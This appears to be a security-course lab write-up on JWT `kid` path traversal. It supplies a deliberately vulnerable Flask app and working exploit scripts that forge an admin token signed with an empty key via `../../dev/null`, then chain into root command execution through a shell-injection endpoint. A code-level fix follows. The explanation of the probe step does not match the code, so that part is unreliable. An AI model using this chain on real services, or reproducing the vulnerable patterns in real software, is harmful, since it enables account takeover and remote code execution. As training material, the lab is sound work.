---
title: "JWT Advanced Lab — kid Path Traversal to Remote Code Execution"
tags: [JWT, kid-injection, path-traversal, RCE, lab, Docker, Flask, PyJWT,
       token-forgery, algorithm-confusion, ATT&CK-T1550, CWE-347]
module: 04-BroadSurface-01
day: 170
related_topics:
  - JWT Advanced Attacks (Day 169)
  - JWT Basics (Day 42)
  - OAuth Abuse Deep Dive (Day 171)
  - Account Takeover Chains (Day 174)
---

# Day 170 — JWT Advanced Lab

> "The theory is clean. The lab makes it real. kid path traversal sounds
> abstract until you see the server load /dev/null as its HMAC secret and your
> forged admin token come back with a 200. Then you understand it in your bones."
>
> — Ghost

---

## Goals

By the end of this lab you will be able to:

1. Exploit a `kid` path traversal vulnerability to load a predictable file
   as the HMAC signing secret.
2. Forge a JWT with admin privileges and bypass the server's authentication.
3. Chain the JWT bypass into an admin command injection endpoint to achieve
   remote code execution.
4. Propose and implement the fix at the code level.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| JWT advanced attacks theory | Day 169 |
| Path traversal | Day 113 |
| Python JWT libraries | Day 42 |
| Command injection | Day 115 |
| Docker Compose | Days 150–151 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-01/samples/jwt-lab/
docker compose up --build -d

# App running at http://localhost:7000
docker compose ps
```

### Lab Source Code

```python
# app.py — intentionally vulnerable JWT lab
from __future__ import annotations
import subprocess, os, hmac, hashlib, base64, json
from pathlib import Path
from flask import Flask, request, jsonify

app = Flask(__name__)
KEYS_DIR = Path("/app/keys")    # Directory containing HMAC secrets

# ── JWT Utilities ──────────────────────────────────────────────────────────
def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def verify_jwt(token: str) -> dict | None:
    """Verify JWT — VULNERABLE: kid used as filename without sanitisation."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))

        kid = header.get("kid", "default")
        # VULNERABILITY: kid used directly in path construction
        key_path = KEYS_DIR / kid
        secret = key_path.read_bytes()      # PATH TRAVERSAL HERE

        alg = header.get("alg", "HS256")
        if alg != "HS256":
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
        actual_sig = b64url_decode(parts[2])

        if not hmac.compare_digest(expected_sig, actual_sig):
            return None
        return payload
    except Exception:
        return None

# ── Routes ─────────────────────────────────────────────────────────────────
@app.route("/api/login", methods=["POST"])
def login():
    data = request.get_json(silent=True) or {}
    if data.get("username") == "user" and data.get("password") == "user123":
        # Create a legitimate user token
        header  = b64url_encode(json.dumps({"alg":"HS256","typ":"JWT","kid":"default"}).encode())
        payload = b64url_encode(json.dumps({"sub":"user","role":"user"}).encode())
        signing_input = f"{header}.{payload}".encode()
        secret = (KEYS_DIR / "default").read_bytes()
        sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
        token = f"{header}.{payload}.{b64url_encode(sig)}"
        return jsonify({"token": token})
    return jsonify({"error": "Invalid credentials"}), 401


@app.route("/api/profile")
def profile():
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    payload = verify_jwt(token)
    if not payload:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"user": payload.get("sub"), "role": payload.get("role")})


@app.route("/api/admin/exec", methods=["POST"])
def admin_exec():
    """Admin-only command execution endpoint (intentionally vulnerable)."""
    token = request.headers.get("Authorization", "").removeprefix("Bearer ")
    payload = verify_jwt(token)
    if not payload or payload.get("role") != "admin":
        return jsonify({"error": "Admin required"}), 403

    # VULNERABILITY: command injection in admin endpoint
    cmd = request.get_json(silent=True).get("cmd", "")
    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True, timeout=5
    )
    return jsonify({"stdout": result.stdout, "stderr": result.stderr})
```

```dockerfile
# Dockerfile
FROM python:3.12-slim
WORKDIR /app
RUN pip install flask
RUN mkdir -p /app/keys && \
    python3 -c "import os; open('/app/keys/default','wb').write(os.urandom(32))"
COPY app.py .
EXPOSE 7000
CMD ["python3", "-m", "flask", "run", "--host=0.0.0.0", "--port=7000"]
```

```yaml
# docker-compose.yml
version: "3.9"
services:
  app:
    build: .
    ports: ["7000:7000"]
```

---

## Objective 1 — Obtain a Legitimate Token

```bash
TOKEN=$(curl -s -X POST http://localhost:7000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"user123"}' | jq -r '.token')

echo "Token: $TOKEN"

# Decode the header to see the kid
echo "${TOKEN%%.*}" | base64 -d 2>/dev/null; echo
# → {"alg":"HS256","typ":"JWT","kid":"default"}
```

The `kid` value is `default`. The server loads `/app/keys/default` as the
HMAC secret.

---

## Objective 2 — Probe for Path Traversal

Test whether the `kid` parameter is sanitised. Construct a token with a
traversal `kid` and an empty string signature — the signature will be wrong,
but the error message tells us whether the path was traversed:

```python
import base64, json, requests

def b64url(data: bytes | dict) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Test kid: ../../etc/passwd (should exist in the container)
probe_header  = b64url({"alg": "HS256", "typ": "JWT", "kid": "../../etc/passwd"})
probe_payload = b64url({"sub": "probe", "role": "user"})
probe_token   = f"{probe_header}.{probe_payload}.invalidsig"

r = requests.get("http://localhost:7000/api/profile",
                 headers={"Authorization": f"Bearer {probe_token}"})
print(r.status_code, r.json())
# 401 {"error":"Unauthorized"} — not a 500 FileNotFoundError → file WAS found
# If 500 → file not found at that path
```

**Note:** if the file exists but the signature is wrong, you get 401. If the
file does not exist, you get 500 or 401 depending on error handling. Either
way: a 401 with a traversal path that returns a real file means traversal works.

---

## Objective 3 — Exploit with /dev/null Key

`/dev/null` always exists on Linux. Reading it returns 0 bytes — an empty
HMAC secret. HMAC-SHA256 with an empty key produces a deterministic signature.

```python
import hmac, hashlib, base64, json, requests

def b64url(data: bytes | dict) -> str:
    if isinstance(data, dict):
        data = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# /app/keys/../../dev/null resolves to /dev/null inside the container
kid_traversal = "../../dev/null"

header  = b64url({"alg": "HS256", "typ": "JWT", "kid": kid_traversal})
payload = b64url({"sub": "admin", "role": "admin", "exp": 9999999999})

signing_input = f"{header}.{payload}".encode()
secret = b""       # empty — /dev/null contains 0 bytes
sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

forged_token = f"{header}.{payload}.{sig_b64}"
print(f"[+] Forged admin token: {forged_token[:80]}...")

# Verify we have admin access
r = requests.get("http://localhost:7000/api/profile",
                 headers={"Authorization": f"Bearer {forged_token}"})
print(f"[+] Profile: {r.json()}")
# → {"user": "admin", "role": "admin"}
```

---

## Objective 4 — Chain to RCE via Admin Exec Endpoint

The admin endpoint at `/api/admin/exec` passes the `cmd` field directly to
`subprocess.run(..., shell=True)` — command injection.

```python
# Read the flag from the container filesystem
def exec_command(token: str, cmd: str) -> str:
    r = requests.post(
        "http://localhost:7000/api/admin/exec",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
        },
        json={"cmd": cmd},
    )
    return r.json().get("stdout", "") + r.json().get("stderr", "")

# Identify who we are running as
print(exec_command(forged_token, "id"))
# → uid=0(root) gid=0(root) groups=0(root)

# Read the environment (may contain secrets)
print(exec_command(forged_token, "env"))

# Read files
print(exec_command(forged_token, "cat /etc/passwd"))
print(exec_command(forged_token, "ls /app/keys/"))
# → default   ← the legitimate HMAC secret file

# Read the legitimate secret
print(exec_command(forged_token, "xxd /app/keys/default"))
```

**Full chain:**

```
Login as user → obtain legitimate JWT
           ↓
Decode header → identify kid = "default"
           ↓
Craft forged JWT with kid = "../../dev/null"
Sign with empty HMAC secret (b"")
           ↓
Send to /api/profile → 200 with role=admin
           ↓
Send to /api/admin/exec with cmd payload
           ↓
Remote code execution as root in container
```

**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` → **9.9 Critical**

---

## Objective 5 — Fix the Vulnerability

```python
import re
from pathlib import Path

KEYS: dict[str, bytes] = {}
KEYS_DIR = Path("/app/keys")

# Load all keys at startup — never touch filesystem during request handling
def load_keys() -> None:
    for key_file in KEYS_DIR.iterdir():
        if re.fullmatch(r"[a-zA-Z0-9_-]{1,64}", key_file.name):
            KEYS[key_file.name] = key_file.read_bytes()

load_keys()


def verify_jwt_fixed(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))

        kid = header.get("kid", "default")
        # FIX: look up key from pre-loaded dict — never touches filesystem
        secret = KEYS.get(kid)
        if secret is None:
            return None   # Unknown kid → reject

        alg = header.get("alg", "HS256")
        if alg != "HS256":      # FIX: reject any other algorithm
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        expected_sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
        actual_sig = b64url_decode(parts[2])

        if not hmac.compare_digest(expected_sig, actual_sig):
            return None
        return payload
    except Exception:
        return None
```

**Verify the fix:** re-run the exploit. The forged token with `kid=../../dev/null`
now returns `None` from `KEYS.get(kid)` and is rejected with 401.

---

## Key Takeaways

1. **kid is an injection surface.** The moment user-controlled data touches a
   filesystem path, database query, or URL — it is an injection point.
2. **Empty key = /dev/null = predictable HMAC.** The attacker does not need
   to know the real secret. They just need a path that returns known bytes.
3. **JWT bypass → admin endpoint → RCE is a realistic chain.** A JWT
   vulnerability alone might pay High. A JWT bypass that chains to RCE pays
   Critical. Always look for what the bypass enables.
4. **The fix is one architectural change:** pre-load all keys at startup into
   a dictionary. Never touch the filesystem during token verification. An
   unknown `kid` gets a hard rejection — no file lookup, no error reveal.
5. **The command injection in the admin endpoint is a separate bug.** Two
   High-severity findings that chain to Critical. Report them both, then chain
   them.

---

## Exercises

1. Modify the exploit to use `/proc/self/cmdline` as the traversal target.
   What does it contain? Can you sign a token using its content as the secret?
2. Write a test that proves the fixed `verify_jwt_fixed()` rejects all four
   traversal paths: `../../dev/null`, `../../etc/passwd`,
   `../../proc/sys/kernel/randomize_va_space`, and a valid `kid=default`.
3. The admin exec endpoint is also vulnerable to command injection. Write a
   separate CVSS-scored finding report for it (assume you already have admin
   access).
4. What would change if the server used RS256 instead of HS256? Could the
   path traversal still work? What attack from Day 169 would then apply?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q170.1, Q170.2 …).
> Follow-up questions use hierarchical numbering (Q170.1.1, Q170.1.2 …).

---

## Navigation

← Previous: [Day 169 — JWT Advanced Attacks](DAY-0169-JWT-Advanced-Attacks.md)
→ Next: [Day 171 — OAuth Abuse Deep Dive](DAY-0171-OAuth-Abuse-Deep-Dive.md)
